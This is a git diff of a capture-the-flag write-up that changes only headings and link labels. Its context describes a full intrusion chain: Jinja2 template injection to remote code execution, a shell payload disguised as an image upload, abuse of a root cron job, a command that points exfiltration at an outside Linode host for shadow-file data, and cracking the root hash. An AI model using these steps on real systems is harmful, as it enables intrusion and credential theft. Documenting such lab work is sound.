@@ -23,7 +23,7 @@ Starting with only public access to the web application, reconnaisance was condu
 <details>
 <summary>Click to expand</summary>
 
-  ## Step One: Gain Access to web application : Leak Sensitive Information
+  ## Step One: Gain Access to web application by abusing Chatbot
   
 Initial discovery activities of the website uncovered the following:
    
@@ -114,9 +114,9 @@ Trial and error testing revealed the following filters and the obfuscations need
 │   → Sandbox hardening present  │
 └───────────────────────────────┘
 ```
-This script was used to enumerate the indexes and evaluate if RCE is possible. The initial command used was a simple 'whoami".
+A script was used to enumerate the indexes and evaluate if RCE is possible. The initial command used was a simple 'whoami".
 
-The enumeration script source code is located here: [Enumeration Script](/resources/snowblind_enumeration2.py)
+The enumeration script source code is located here: [Jinja2 SSTI Enumeration Script](/resources/snowblind_enumeration2.py)
 
 ![SSTI Enumeration](/images/snowblind_enumeration1.jpg) 
 
@@ -124,7 +124,7 @@ The following indexes where discovered that would allow RCE:
 
 ![SSTI Enumeration](/images/snowblind_enumeration2.jpg) 
 
-## Step Three: Achieve Shell Access : Insecure File Upload
+## Step Three: Achieve Shell Access Utilizing Insecure File Upload
 
 The following payload was inserted into a file called payload.jpg and uploaded to the admin profile.
 
@@ -139,7 +139,7 @@ Selecting index 205 with get > os > popen.read() as our target, the following co
 sh /app/static/images/admin\\u005ff1f9cc53781abb79\\u002epng
 ```
 
-## Step Four: Exfilitrate Data : Insecure processes / Data Leakage
+## Step Four: Exfilitrate Data leveraging an Insecure processes / Data Leakage
 
 With initial access established, time for more recon. An interesting cron job was located in /etc/cron/cron.d/mycron. It runs a backup script every minute as root. 
 
@@ -164,7 +164,7 @@ echo "http://45-79-190-29.ip.linodeusercontent.com:8000/exfil" > /dev/shm/.frost
 
 The exfiltrated data file is located here: [Exfiltrated File](/resources/shadow_exfil.png)
 
-## Step Five:  Decode PNG file : Leak Sensitive Information
+## Step Five:  Decode PNG file
 
 Since we have the backup script, we know the encryption mechanism. We also know what the first block of data encrypted is "root:$". With this information, we can decode the file.
 
@@ -174,7 +174,7 @@ The file was damaged or incomplete, so the script suppresses errors and forces t
 
 ![Decoded PNG File](/images/snowblind_decodedpng.jpg) 
 
-## Step Six: Crack Hash for Root : Weak Password 
+## Step Six: Crack Hash for Root
 
 With the password hash, salt, and the algorithm used, we can attempt to crack the hash using John the Ripper and the rockyou word list.
 
